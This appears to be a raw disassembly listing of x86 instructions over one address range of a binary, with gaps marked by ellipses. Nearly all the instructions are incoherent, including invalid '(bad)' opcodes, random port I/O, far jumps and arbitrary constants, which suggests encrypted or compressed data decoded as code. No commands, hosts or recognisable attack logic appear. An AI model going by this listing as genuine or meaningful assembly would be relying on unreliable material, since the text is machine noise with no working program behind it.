  42c728:	scas   eax,DWORD PTR es:[edi]
  42c729:	mov    bh,0x84
  42c72b:	and    al,0x8b
  42c72d:	imul   esp,DWORD PTR [esi-0x70dcc6ef],0xffffffac
  42c734:	repz jno 0x42c744
  42c737:	sbb    ah,BYTE PTR [ebx]
  42c739:	inc    ebp
  42c73a:	ja     0x42c709
  42c73c:	sbb    DWORD PTR [esi],ebp
  42c73e:	in     al,0xc5
  42c740:	outs   dx,BYTE PTR ds:[esi]
  42c741:	rol    BYTE PTR [ebp-0x70],cl
  42c744:	outs   dx,DWORD PTR ds:[esi]
  42c745:	cmp    al,bh
  42c747:	loope  0x42c78a
  42c749:	orps   xmm0,XMMWORD PTR [edx+0x3a]
  42c74d:	repz jmp 0x88f2:0x2c6eac13
  42c755:	xor    DWORD PTR ds:[edx],ecx
  42c758:	ds sbb eax,0xf7e90f3
  42c75e:	inc    ecx
  42c75f:	addr16 jp 0x42c766
  42c762:	mov    edx,0xa40e4f13
  42c767:	stos   DWORD PTR es:[edi],eax
  42c768:	sbb    edi,DWORD PTR [ebp-0x50]
  42c76b:	sbb    DWORD PTR [eax+0x6d],0xe6bc65eb
  42c772:	mov    ds:0xff54ed5f,eax
  42c777:	push   ecx
  42c778:	out    dx,eax
  42c779:	jne    0x42c758
  42c77b:	cmp    eax,0xaae97d4a
  42c780:	fiadd  WORD PTR [esi-0x759b57d0]
  42c786:	fisubr DWORD PTR [ebx+ebx*8+0x25]
  42c78a:	or     al,0x43
  42c78c:	push   esp
  42c78d:	cld    
  42c78e:	mov    al,ds:0x5abea4a3
  42c793:	loopne 0x42c71b
  42c795:	xchg   ebp,eax
  42c796:	jbe    0x42c76c
  42c798:	sub    ecx,DWORD PTR [edx-0x51]
  42c79b:	push   ss
  42c79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c79d:	(bad)
  42c7a0:	aas    
  42c7a1:	fistp  QWORD PTR [edi]
  42c7a3:	xor    eax,0xfc3dd0fc
  42c7a8:	mov    edx,0xd52488b8
  42c7ad:	dec    ecx
  42c7ae:	pop    esi
  42c7af:	aas    
  42c7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7b1:	mov    ebp,0xfcc357ed
  42c7b6:	aas    
  42c7b7:	adc    eax,0x4af4db50
  42c7bc:	idiv   DWORD PTR [edi+eiz*4+0x8e40]
	...
  42c833:	add    al,ch
  42c835:	popf   
  42c836:	mov    esi,0xf9e7ffe7
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xa9001153
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    BYTE PTR [ecx],ah
  42c84d:	sub    BYTE PTR [ebp+ecx*4-0x670ed530],ah
  42c854:	push   ds
  42c855:	aaa    
  42c856:	jb     0x42c7e0
  42c858:	jbe    0x42c818
  42c85a:	and    dh,BYTE PTR [ecx]
  42c85c:	ret    
  42c85d:	sbb    edi,ecx
  42c85f:	mov    ebx,0x512fe0b9
  42c864:	(bad)  [esi+edx*4-0x7ff79181]
  42c86b:	adc    BYTE PTR [ecx-0x5941cba1],cl
  42c871:	sub    eax,0x9b95b54
  42c876:	dec    eax
  42c877:	in     eax,0xa2
  42c879:	fsubr  st,st(2)
  42c87b:	cmp    ch,BYTE PTR [esi]
  42c87d:	xchg   ebx,eax
  42c87e:	xor    eax,0x33b2623
  42c883:	xor    al,0x40
  42c885:	and    ebx,esp
  42c887:	or     DWORD PTR [ebx],0x20422138
  42c88d:	mov    WORD PTR [ebx+0x3730e9f2],es
  42c893:	retf   0x5842
  42c896:	pop    esp
  42c897:	xchg   edi,eax
  42c898:	mov    BYTE PTR [esi],ch
  42c89a:	ja     0x42c843
  42c89c:	inc    ecx
  42c89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c89e:	dec    ebp
  42c89f:	dec    esp
  42c8a0:	cmp    DWORD PTR ds:[edi+0x51],0x527940a0
  42c8a8:	dec    edx
  42c8a9:	fisttp WORD PTR [esi+0x2c]
  42c8ac:	addr16 or esi,edx
  42c8af:	rol    DWORD PTR [edi-0x5e],0x3a
  42c8b3:	out    dx,eax
  42c8b4:	aam    0x6
  42c8b6:	pushf  
  42c8b7:	ins    DWORD PTR es:[edi],dx
  42c8b8:	jp     0x42c8b6
  42c8ba:	sti    
  42c8bb:	adc    cl,BYTE PTR [ebx+0x7f29b61b]
  42c8c1:	aam    0x90
  42c8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8c4:	in     eax,dx
  42c8c5:	sbb    DWORD PTR [ecx],ebp
  42c8c7:	stc    
  42c8c8:	mov    BYTE PTR [ecx],dl
  42c8ca:	push   ss
  42c8cb:	cdq    
  42c8cc:	std    
  42c8cd:	ins    DWORD PTR es:[edi],dx
  42c8ce:	(bad)  
  42c8cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c8d0:	loop   0x42c8ee
  42c8d2:	cwde   
  42c8d3:	shl    ebx,0xb0
  42c8d6:	and    esp,DWORD PTR [ecx+0x2e]
  42c8d9:	test   al,0x5e
  42c8db:	mov    ds:0x4140fa02,al
  42c8e0:	lods   al,BYTE PTR ds:[esi]
  42c8e1:	pop    eax
  42c8e2:	je     0x42c868
  42c8e4:	dec    esi
  42c8e5:	ss push es
  42c8e7:	and    BYTE PTR [edx-0x6e],dl
  42c8ea:	adc    eax,0xcbabd16d
  42c8ef:	pop    es
  42c8f0:	jge    0x42c8ea
  42c8f2:	or     eax,0x46f14d43
  42c8f7:	sar    DWORD PTR [ebx],0xbe
  42c8fa:	lock inc esi
  42c8fc:	mov    edi,0x32b663aa
  42c901:	mov    ebp,DWORD PTR [eax+0x77]
  42c904:	retf   0xc46e
  42c907:	cmp    BYTE PTR [ecx],cl
  42c909:	mov    ebp,0xecd8e1c5
  42c90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c90f:	pop    ss
  42c910:	test   al,0x25
  42c912:	or     esp,DWORD PTR [ecx+0x37]
  42c915:	(bad)  
  42c917:	adc    eax,0x88d3810d
  42c91c:	out    dx,al
  42c91d:	add    BYTE PTR [esi+0x3c],ah
  42c920:	ret    0xa939
  42c923:	outs   dx,BYTE PTR ds:[esi]
  42c924:	retf   
  42c925:	mov    ecx,0x2426b63f
  42c92a:	test   al,0xe2
  42c92c:	cmp    BYTE PTR [eax+0x1c080263],al
  42c932:	push   edx
  42c933:	lods   eax,DWORD PTR ds:[esi]
  42c934:	pop    es
  42c935:	data16 and al,0x9
  42c938:	sbb    esp,DWORD PTR [eax-0x70]
  42c93b:	mov    edi,0x79939496
  42c940:	or     al,0x0
	...
  42c9b2:	add    BYTE PTR [eax],al
  42c9b4:	mov    eax,DWORD PTR [edi]
  42c9b6:	mov    al,0xe2
  42c9b8:	mov    esp,0xb56fdbf7
  42c9bd:	ficom  DWORD PTR [esi+0x22]
  42c9c0:	leave  
  42c9c1:	gs mov ebp,0x1d7adb9
  42c9c7:	add    ch,dh
  42c9c9:	add    BYTE PTR [eax],al
  42c9cb:	add    BYTE PTR [ebp-0x7a],cl
  42c9ce:	dec    ebx
  42c9cf:	sbb    edx,edx
  42c9d1:	cmp    eax,ecx
  42c9d3:	fld    QWORD PTR [edx]
  42c9d5:	into   
  42c9d6:	in     eax,0x5a
  42c9d8:	int    0xcc
  42c9da:	pop    ss
  42c9db:	sahf   
  42c9dc:	call   0x1058148
  42c9e1:	mov    bl,0x7c
  42c9e3:	jb     0x42ca16
  42c9e5:	shr    DWORD PTR [ecx],1
  42c9e7:	xchg   ecx,eax
  42c9e8:	cdq    
  42c9e9:	cs scas eax,DWORD PTR es:[edi]
  42c9eb:	dec    ebx
  42c9ec:	call   0x8b0eee9c
  42c9f1:	push   esi
  42c9f2:	jl     0x42ca1a
  42c9f4:	sbb    ecx,edx
  42c9f6:	sti    
  42c9f7:	sub    eax,0xd1eb0844
  42c9fc:	js     0x42ca79
  42c9fe:	inc    ecx
  42c9ff:	lock inc ecx
  42ca01:	mov    edi,0x66958b9
  42ca06:	mov    ecx,0xf244266a
  42ca0b:	mov    bh,0x1e
  42ca0d:	jb     0x42c9ec
  42ca0f:	(bad)  
  42ca11:	fdiv   QWORD PTR [ebx]
  42ca13:	push   ds
  42ca14:	push   ds
  42ca15:	adc    eax,0xb5c938b1
  42ca1a:	fisubr WORD PTR [ebp+0x7d]
  42ca1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca1e:	sub    BYTE PTR [esi+0x4916841a],0xcc
  42ca25:	into   
  42ca26:	cdq    
  42ca27:	stos   BYTE PTR es:[edi],al
  42ca28:	das    
  42ca29:	repz mov bl,0xf2
  42ca2c:	or     BYTE PTR [edi-0x1c88a3f],bl
  42ca32:	loope  0x42c9c4
  42ca34:	adc    al,0xd3
  42ca36:	or     cl,BYTE PTR [edi+0x5d]
  42ca39:	jl     0x42caab
  42ca3b:	mov    dl,0x4f
  42ca3d:	inc    eax
  42ca3e:	ja     0x42c9f3
  42ca40:	pop    esi
  42ca41:	(bad)  
  42ca42:	and    bh,BYTE PTR [edi]
  42ca44:	mov    ch,0x22
  42ca46:	(bad)  
  42ca47:	sahf   
  42ca48:	sar    BYTE PTR [esi+0x76],0x7d
  42ca4c:	mov    ebp,DWORD PTR gs:[ecx]
  42ca4f:	xor    eax,0x7d8dbb3b
  42ca54:	dec    edx
  42ca55:	lods   eax,DWORD PTR ds:[esi]
  42ca56:	aas    
  42ca57:	mov    DWORD PTR [ecx],ebx
  42ca59:	push   ebp
  42ca5a:	mov    al,0xde
  42ca5c:	adc    DWORD PTR [ecx],0xffffff9c
  42ca5f:	mov    bl,0xde
  42ca61:	push   0xcb68c3b5
  42ca66:	sub    cl,bl
  42ca68:	push   ecx
  42ca69:	add    al,0x18
  42ca6b:	gs xor al,0xdf
  42ca6e:	add    eax,0x53215502
  42ca73:	ds cdq 
  42ca75:	dec    ebp
  42ca76:	xor    DWORD PTR [ecx-0x3824b645],0x1a
  42ca7d:	fcmovu st,st(5)
  42ca7f:	inc    esp
  42ca80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca81:	dec    eax
  42ca82:	jge    0x42ca3c
  42ca84:	shl    DWORD PTR [ebx],cl
  42ca86:	xchg   ecx,eax
  42ca87:	and    BYTE PTR [edi+0x3dadc6c9],0x27
  42ca8e:	aad    0xbb
  42ca90:	fsub   DWORD PTR [ebx-0x43]
  42ca93:	adc    DWORD PTR [ecx+0x300cdcf3],esp
  42ca99:	fsubr  QWORD PTR [edi]
  42ca9b:	pop    ds
  42ca9c:	mov    edx,0x17ca5dd7
  42caa1:	mov    ah,0x9d
  42caa3:	call   0x76d93680
  42caa8:	lea    edx,[esp+edi*2]
  42caab:	or     eax,0x7b30f104
  42cab0:	jmp    0x42ca4a
  42cab2:	or     BYTE PTR [ecx-0x27],cl
  42cab5:	mov    eax,ds:0x86d8a3a6
  42caba:	cwde   
  42cabb:	and    eax,0xa0ac34b
  42cac0:	lahf   
	...
  42cb31:	add    BYTE PTR [eax],al
  42cb33:	add    BYTE PTR [eax+ebp*1],dh
  42cb36:	add    DWORD PTR [esi],eax
  42cb38:	sbb    eax,0x6e3a372f
  42cb3d:	(bad)  
  42cb3e:	sbb    al,al
  42cb40:	mov    BYTE PTR [esi],cl
  42cb42:	(bad)  
  42cb43:	fbld   TBYTE PTR [edx-0xafffe28]
  42cb49:	add    BYTE PTR [eax],al
  42cb4b:	add    BYTE PTR [ebx+0x5a],al
  42cb4e:	dec    edx
  42cb4f:	aam    0xf1
  42cb51:	xor    al,0x25
  42cb53:	daa    
  42cb54:	inc    edx
  42cb55:	mov    ds:0x119f98b4,eax
  42cb5a:	scas   eax,DWORD PTR es:[edi]
  42cb5b:	mov    esp,0x952796a7
  42cb60:	repz imul edx,DWORD PTR [esi+0x10],0x7b9f1a2b
  42cb68:	repz popa 
  42cb6a:	push   0x6f
  42cb6c:	out    0xf,al
  42cb6e:	aas    
  42cb6f:	inc    edi
  42cb70:	push   0xffffffc9
  42cb72:	push   eax
  42cb73:	sbb    eax,0xac3ce2c2
  42cb78:	sbb    BYTE PTR [esi],dh
  42cb7a:	(bad)  [edx-0x428cc078]
  42cb80:	add    BYTE PTR [edi],bh
  42cb82:	stos   BYTE PTR es:[edi],al
  42cb83:	stos   DWORD PTR es:[edi],eax
  42cb84:	mul    DWORD PTR [edi]
  42cb86:	dec    esi
  42cb87:	jmp    0xf4bead83
  42cb8c:	inc    ebx
  42cb8d:	mov    edi,0x46c81531
  42cb92:	aaa    
  42cb93:	mov    eax,?
  42cb95:	xor    al,0x6a
  42cb97:	jae    0x42cbdf
  42cb99:	jp     0x42cb1d
  42cb9b:	add    al,0xb7
  42cb9d:	mov    esi,0x3e483dcd
  42cba2:	pop    ebx
  42cba3:	pop    esi
  42cba4:	vpminsw xmm7,xmm4,XMMWORD PTR [ecx+0x72aca03c]
  42cbac:	inc    eax
  42cbad:	fidivr WORD PTR [eax]
  42cbaf:	push   cs
  42cbb0:	mov    al,BYTE PTR [eax]
  42cbb2:	adc    bh,BYTE PTR [ebx-0x5320ec65]
  42cbb8:	mov    cl,0x31
  42cbba:	cwde   
  42cbbb:	push   esp
  42cbbc:	xlat   BYTE PTR ds:[ebx]
  42cbbd:	cmp    DWORD PTR [esi-0x811b681],esp
  42cbc3:	jg     0x42cb4d
  42cbc5:	lea    eax,[ebx]
  42cbc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbc8:	adc    al,0xe3
  42cbca:	into   
  42cbcb:	jle    0x42cbff
  42cbcd:	mov    dl,0x19
  42cbcf:	push   ebp
  42cbd0:	mov    ebx,0xb75e9b1
  42cbd5:	imul   eax,DWORD PTR [esi-0x61],0xf12f5ce7
  42cbdc:	add    ecx,0x95fa4576
  42cbe2:	es jae 0x42cc2a
  42cbe5:	(bad)  
  42cbe6:	int    0xdf
  42cbe8:	setg   BYTE PTR [ebp+0x4049762d]
  42cbef:	adc    edi,DWORD PTR [esp+ebx*4+0x661731de]
  42cbf6:	add    dh,dl
  42cbf8:	mov    ecx,DWORD PTR [esi+0x58]
  42cbfb:	cdq    
  42cbfc:	and    bl,bh
  42cbfe:	inc    edx
  42cbff:	into   
  42cc00:	jmp    0xcdfd0ffc
  42cc05:	hlt    
  42cc06:	scas   al,BYTE PTR es:[edi]
  42cc07:	ins    DWORD PTR es:[edi],dx
  42cc08:	pop    esp
  42cc09:	pop    ss
  42cc0a:	cli    
  42cc0b:	sti    
  42cc0c:	mov    ah,0xe8
  42cc0e:	and    ah,dh
  42cc10:	xchg   DWORD PTR [ecx+0x5e1be26b],edx
  42cc16:	jne    0x42cc13
  42cc18:	out    dx,eax
  42cc19:	add    edx,ebp
  42cc1b:	ds mov ecx,0xeb70c0ed
  42cc21:	shl    BYTE PTR [edx+0x61b5ec72],0x23
  42cc28:	cmc    
  42cc29:	scas   al,BYTE PTR es:[edi]
  42cc2a:	and    esp,esi
  42cc2c:	inc    edi
  42cc2d:	rol    DWORD PTR [esi-0x26],0xd5
  42cc31:	fist   DWORD PTR [edi-0x3b4ed21c]
  42cc37:	jns    0x42cbfa
  42cc39:	cmp    al,0xde
  42cc3b:	les    esp,FWORD PTR ds:0x24be23c1
	...
  42ccb1:	add    BYTE PTR [eax],al
  42ccb3:	add    BYTE PTR [eax-0x61eb634a],dh
  42ccb9:	ds mov eax,0xcad7b5b6
  42ccbf:	sub    esp,DWORD PTR [eax+eiz*8]
  42ccc2:	arpl   di,bx
  42ccc4:	xchg   edi,eax
  42ccc5:	fld    DWORD PTR [ecx]
  42ccc7:	add    ch,dh
  42ccc9:	add    BYTE PTR [eax],al
  42cccb:	add    bh,ch
  42cccd:	cmp    BYTE PTR [ecx+ecx*8-0x7a],ch
  42ccd1:	sbb    esi,DWORD PTR cs:[ecx-0x9fbb625]
  42ccd8:	pop    es
  42ccd9:	mov    dh,0x32
  42ccdb:	inc    edx
  42ccdc:	lahf   
  42ccdd:	xchg   ecx,eax
  42ccde:	(bad)  
  42cce0:	push   0x41
  42cce2:	jae    0x42ccc7
  42cce4:	retf   0x97af
  42cce7:	dec    esp
  42cce8:	or     eax,ebx
  42ccea:	fsubrp st(1),st
  42ccec:	(bad)  
  42ccee:	xchg   esi,eax
  42ccef:	aad    0xad
  42ccf1:	cdq    
  42ccf2:	sub    ecx,DWORD PTR [ebx-0x5]
  42ccf5:	call   0x7ef1a955
  42ccfa:	nop
  42ccfb:	sti    
  42ccfc:	push   0xebd1e12f
  42cd01:	lock xor esp,esi
  42cd04:	adc    eax,0x560efc68
  42cd09:	rcl    DWORD PTR [ebx+eax*4+0x6e],1
  42cd0d:	iret   
  42cd0e:	int    0x77
  42cd10:	and    eax,0xebc85498
  42cd15:	iret   
  42cd16:	sub    BYTE PTR [edx+0x39ad5fd6],dl
  42cd1c:	imul   DWORD PTR [edx+0x11]
  42cd1f:	lahf   
  42cd20:	adc    cl,BYTE PTR [esi-0x47069823]
  42cd26:	add    DWORD PTR [esi+0x52],edx
  42cd29:	jmp    0xab7aab2a
  42cd2e:	test   DWORD PTR [ecx-0x65],esi
  42cd31:	xor    DWORD PTR [edx+esi*1],esp
  42cd34:	pop    ebx
  42cd35:	dec    edi
  42cd36:	(bad)  
  42cd37:	inc    esi
  42cd38:	push   es
  42cd39:	mov    ebx,0x551428d6
  42cd3e:	push   edx
  42cd3f:	adc    BYTE PTR [eax-0x7e],ah
  42cd42:	jo     0x42cd43
  42cd44:	jae    0x42cdb0
  42cd46:	mov    esp,0xb608acf2
  42cd4b:	fnsave [edi+0x6]
  42cd4e:	fnstcw WORD PTR [edx+0x50c29d09]
  42cd54:	into   
  42cd55:	ret    
  42cd56:	sub    edx,0xbdae3288
  42cd5c:	shr    esp,cl
  42cd5e:	push   edx
  42cd5f:	jne    0x42cd58
  42cd61:	cmp    edx,esp
  42cd63:	hlt    
  42cd64:	push   ebx
  42cd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd66:	loope  0x42cd4d
  42cd68:	das    
  42cd69:	mov    ebx,0xddc52215
  42cd6e:	stc    
  42cd6f:	jae    0x42cd92
  42cd71:	jbe    0x42cd9d
  42cd73:	outs   dx,DWORD PTR ds:[esi]
  42cd74:	mov    al,0xbd
  42cd76:	add    al,0xcf
  42cd78:	pop    esp
  42cd79:	xchg   ebp,eax
  42cd7a:	xchg   DWORD PTR ds:0x263ad5e0,ebp
  42cd80:	int    0x59
  42cd82:	mov    ah,0xdd
  42cd84:	mov    ecx,0x9d4a54c9
  42cd89:	mov    eax,0x12734f98
  42cd8e:	inc    esp
  42cd8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd90:	mov    esp,0xec8dc810
  42cd95:	mov    ds,WORD PTR [eax]
  42cd97:	xor    BYTE PTR [esi+eiz*4],dh
  42cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd9b:	xor    DWORD PTR [edi+0x1cc74f84],eax
  42cda1:	mov    BYTE PTR [eax+eax*4-0x2a5bb7eb],ah
  42cda8:	sahf   
  42cda9:	leave  
  42cdaa:	adc    BYTE PTR ss:[edx-0x5b],cl
  42cdae:	aad    0xb9
  42cdb0:	hlt    
  42cdb1:	adc    al,0xe0
  42cdb3:	std    
  42cdb4:	imul   DWORD PTR [esi-0x444ca000]
  42cdba:	cmp    esp,ebp
  42cdbc:	lahf   
  42cdbd:	push   0x262ebb
	...
  42ce32:	add    BYTE PTR [eax],al
  42ce34:	xchg   edi,eax
  42ce35:	and    BYTE PTR [edi-0x26],al
  42ce38:	idiv   edi
  42ce3a:	lahf   
  42ce3b:	ins    DWORD PTR es:[edi],dx
  42ce3c:	mov    edx,0x5b19410a
  42ce41:	push   ss
  42ce42:	out    dx,al
  42ce43:	iret   
  42ce44:	mov    edx,ds
  42ce46:	add    DWORD PTR [eax],eax
  42ce48:	cmc    
  42ce49:	add    BYTE PTR [eax],al
  42ce4b:	add    al,al
  42ce4d:	add    al,0x27
  42ce4f:	jmp    0x42ce53
  42ce51:	(bad)  
  42ce52:	jle    0x42ce45
  42ce54:	cmp    esi,esp
  42ce56:	xchg   ebp,eax
  42ce57:	cwde   
  42ce58:	inc    DWORD PTR [edi+0x79]
  42ce5b:	int3   
  42ce5c:	pop    ds
  42ce5d:	js     0x42cede
  42ce5f:	dec    ebp
  42ce60:	sar    BYTE PTR [ecx+0x2c],0x7
  42ce64:	idiv   DWORD PTR [ebx+0x58]
  42ce67:	js     0x42ce7d
  42ce69:	daa    
  42ce6a:	shl    bl,1
  42ce6c:	pop    ebx
  42ce6d:	adc    DWORD PTR [esi-0x4d],0x1f
  42ce71:	inc    ebp
  42ce72:	daa    
  42ce73:	rol    edx,0x59
  42ce76:	cld    
  42ce77:	push   cs
  42ce78:	or     DWORD PTR [ecx+edx*4-0x7d],ebx
  42ce7c:	adc    DWORD PTR [ebx+0x1a91f95],ecx
  42ce82:	or     edx,DWORD PTR [ebx+0x50935c7c]
  42ce88:	lahf   
  42ce89:	xor    ch,ch
  42ce8b:	(bad)  
  42ce8c:	and    dh,al
  42ce8e:	imul   ebp,DWORD PTR [ebp-0x614ac0df],0x6e
  42ce95:	add    BYTE PTR [esi+eax*4+0x70e30c5f],ah
  42ce9c:	xchg   ecx,eax
  42ce9d:	rcr    BYTE PTR [edx-0x7d6bb029],0x90
  42cea4:	mov    dl,0xdf
  42cea6:	mov    BYTE PTR [ecx-0x15],bl
  42cea9:	in     al,dx
  42ceaa:	mov    eax,ds:0xf371ee06
  42ceaf:	cmc    
  42ceb0:	jae    0x42cf1d
  42ceb2:	sti    
  42ceb3:	and    eax,0x72f8d082
  42ceb8:	xchg   esp,eax
  42ceb9:	inc    edi
  42ceba:	pop    ss
  42cebb:	adc    eax,0xd56ecd00
  42cec0:	push   eax
  42cec1:	pusha  
  42cec2:	sbb    BYTE PTR [ebx+0x26e008c5],ah
  42cec8:	out    0x1e,eax
  42ceca:	pop    edx
  42cecb:	cli    
  42cecc:	sbb    al,0x2c
  42cece:	sbb    al,BYTE PTR [edi-0x19]
  42ced1:	adc    ebx,DWORD PTR [eax]
  42ced3:	jg     0x42ce55
  42ced5:	xor    eax,0x8d155044
  42ceda:	xor    DWORD PTR ds:0x84e93f0e,edx
  42cee0:	cmp    al,0xd5
  42cee2:	loope  0x42ceba
  42cee4:	test   eax,0x2808a464
  42cee9:	inc    ecx
  42ceea:	cmc    
  42ceeb:	pushf  
  42ceec:	inc    edx
  42ceed:	(bad)  
  42ceee:	jnp    0x42cefb
  42cef0:	jno    0x42ce78
  42cef2:	imul   eax,DWORD PTR [edx],0xffffffcd
  42cef5:	inc    edi
  42cef6:	cdq    
  42cef7:	addr16 or eax,0x39f61f3c
  42cefe:	inc    esp
  42ceff:	mov    WORD PTR [edi-0x51ac01c6],fs
  42cf05:	cmp    ch,BYTE PTR ds:0xc998ccbc
  42cf0b:	and    DWORD PTR [edx-0x80],eax
  42cf0e:	dec    esp
  42cf0f:	pop    es
  42cf10:	fcomp  QWORD PTR [esi+0x20]
  42cf13:	cmc    
  42cf14:	xchg   DWORD PTR [esi-0x6a],esp
  42cf17:	icebp  
  42cf18:	mov    WORD PTR [ecx],gs
  42cf1a:	jo     0x42cf4a
  42cf1c:	lock (bad) 
  42cf1e:	jnp    0x42cf2f
  42cf20:	in     al,0x87
  42cf22:	(bad)  
  42cf23:	mov    ebp,0xb1045d3b
  42cf28:	mov    BYTE PTR [edi-0x5117b5ff],dh
  42cf2e:	and    ecx,DWORD PTR [edi+0x37]
  42cf31:	adc    BYTE PTR [edi],0x4e
  42cf34:	cld    
  42cf35:	loopne 0x42ced2
  42cf37:	jo     0x42cf50
  42cf39:	shl    BYTE PTR [edx],1
  42cf3b:	xchg   ebx,eax
  42cf3c:	pushf  
  42cf3d:	imul   esi,DWORD PTR [edx-0x5a],0x76
	...
  42cfb4:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42cfba:	jg     0x42cf56
  42cfbc:	loope  0x42cfcc
  42cfbe:	cs mov al,0x82
  42cfc1:	(bad)  
  42cfc2:	adc    eax,0x1db814d
  42cfc7:	add    ch,dh
  42cfc9:	add    BYTE PTR [eax],al
  42cfcb:	add    ah,cl
  42cfcd:	pop    eax
  42cfce:	ficom  WORD PTR [esi]
  42cfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfd1:	js     0x42d03c
  42cfd3:	mov    bl,0x5
  42cfd5:	pop    ebp
  42cfd6:	lds    eax,FWORD PTR [eax]
  42cfd8:	shl    BYTE PTR [edx-0x54cf7ece],cl
  42cfde:	cli    
  42cfdf:	sar    DWORD PTR [eax],cl
  42cfe1:	adc    BYTE PTR [edx-0x39],ah
  42cfe4:	daa    
  42cfe5:	sahf   
  42cfe6:	inc    edi
  42cfe7:	mov    BYTE PTR [esi+0x1],cl
  42cfea:	mov    edi,DWORD PTR [edx+0x28]
  42cfed:	sbb    BYTE PTR [esi],dl
  42cfef:	xchg   DWORD PTR [ecx+0x5876611b],esp
  42cff5:	fmul   DWORD PTR [esi+0x6171d9b8]
  42cffb:	nop
  42cffc:	or     eax,0x2f55c0f
  42d001:	pop    edi
  42d002:	pop    esi
  42d003:	je     0x42d04b
  42d005:	outs   dx,DWORD PTR ds:[esi]
  42d006:	jl     0x42d04d
  42d008:	out    0xeb,al
  42d00a:	in     al,0xb3
  42d00c:	mov    bl,0xbe
  42d00e:	leave  
  42d00f:	cs lock or ch,dh
  42d013:	push   0xc9260a17
  42d018:	les    edi,FWORD PTR [ebx+0x4210f1f5]
  42d01e:	inc    esp
  42d01f:	icebp  
  42d020:	shl    BYTE PTR [ebp-0x3e],0x1c
  42d024:	loope  0x42d09b
  42d026:	xlat   BYTE PTR ds:[ebx]
  42d027:	pop    esi
  42d028:	pop    eax
  42d029:	cmp    al,0x4c
  42d02b:	jno    0x42cff9
  42d02d:	or     BYTE PTR ds:0x876d3307,cl
  42d033:	clc    
  42d034:	dec    edi
  42d035:	loopne 0x42cff7
  42d037:	lods   eax,DWORD PTR ds:[esi]
  42d038:	push   es
  42d039:	mov    dh,0x5c
  42d03b:	xchg   BYTE PTR [esi+0x16],cl
  42d03e:	add    ecx,DWORD PTR [esi-0x1b96a854]
  42d044:	fs ja  0x42d081
  42d047:	xor    bh,BYTE PTR [edx+ebp*2+0xb]
  42d04b:	mov    edi,0xb55c7d0b
  42d050:	out    dx,al
  42d051:	mov    edx,0x94b52d28
  42d056:	int3   
  42d057:	and    al,0x9d
  42d059:	nop
  42d05a:	dec    ebx
  42d05b:	sub    ch,bh
  42d05d:	(bad)  
  42d05e:	shr    BYTE PTR [ebp-0x3c],1
  42d061:	call   0x1afbf766
  42d066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d067:	(bad)  [esi-0x6a]
  42d06a:	xlat   BYTE PTR ds:[ebx]
  42d06b:	retf   
  42d06c:	mov    ebx,0xe46d28c0
  42d071:	xchg   edx,eax
  42d072:	inc    ebp
  42d073:	enter  0xce6,0xbc
  42d077:	add    ebp,DWORD PTR [esi]
  42d079:	sub    ebp,DWORD PTR [ebx]
  42d07b:	ss dec ebp
  42d07d:	icebp  
  42d07e:	dec    edi
  42d07f:	push   0x143d7a36
  42d084:	int3   
  42d085:	fwait
  42d086:	imul   ebp,DWORD PTR [ebp+0x20],0x3d
  42d08a:	push   ss
  42d08b:	mov    bl,0x6f
  42d08d:	pop    es
  42d08e:	stos   BYTE PTR es:[edi],al
  42d08f:	xchg   ebx,eax
  42d090:	jmp    0x42d03a
  42d092:	fxch   st(7)
  42d094:	imul   esi,DWORD PTR [ebx+0x52],0x6d
  42d098:	pop    edx
  42d099:	jae    0x42d0a4
  42d09b:	sti    
  42d09c:	lods   eax,DWORD PTR ds:[esi]
  42d09d:	mov    ecx,DWORD PTR [eax-0x4d]
  42d0a0:	sbb    DWORD PTR [edx+ecx*1],esp
  42d0a3:	retf   
  42d0a4:	int    0xc2
  42d0a6:	pop    DWORD PTR [ebp-0x49]
  42d0a9:	adc    ch,cl
  42d0ab:	rol    DWORD PTR [esi+0x6775d25],cl
  42d0b1:	aam    0x92
  42d0b3:	int    0xbd
  42d0b5:	xchg   ebx,eax
  42d0b6:	cli    
  42d0b7:	sbb    esp,ecx
  42d0b9:	out    0xc6,al
  42d0bb:	fcom   DWORD PTR ds:0x13709867
	...
  42d131:	add    BYTE PTR [eax],al
  42d133:	add    BYTE PTR [ecx-0x7e],ch
  42d136:	int    0xae
  42d138:	out    dx,eax
  42d139:	out    dx,eax
  42d13a:	imul   eax,edi,0x41
  42d13d:	cdq    
  42d13e:	xor    eax,0xc6ba350
  42d143:	pop    ebp
  42d144:	jbe    0x42d122
  42d146:	add    DWORD PTR [eax],eax
  42d148:	cmc    
  42d149:	add    BYTE PTR [eax],al
  42d14b:	add    BYTE PTR [edx-0x2c],ah
  42d14e:	or     al,cl
  42d150:	fwait
  42d151:	cmp    ecx,DWORD PTR [edi+0x3ec1b213]
  42d157:	push   edi
  42d158:	das    
  42d159:	mov    eax,0x54d232de
  42d15e:	enter  0xe0bd,0x2d
  42d162:	lods   al,BYTE PTR ds:[esi]
  42d163:	outs   dx,DWORD PTR ds:[esi]
  42d164:	mov    edi,0xdf9a24d3
  42d169:	pop    esi
  42d16a:	popf   
  42d16b:	das    
  42d16c:	sub    al,0xab
  42d16e:	repnz stos DWORD PTR es:[edi],eax
  42d170:	sbb    DWORD PTR [ebx+ebx*8],ecx
  42d173:	pop    es
  42d174:	or     BYTE PTR [esi-0x5a],dl
  42d177:	add    ebx,DWORD PTR [ecx-0x4dfebce4]
  42d17d:	adc    ecx,eax
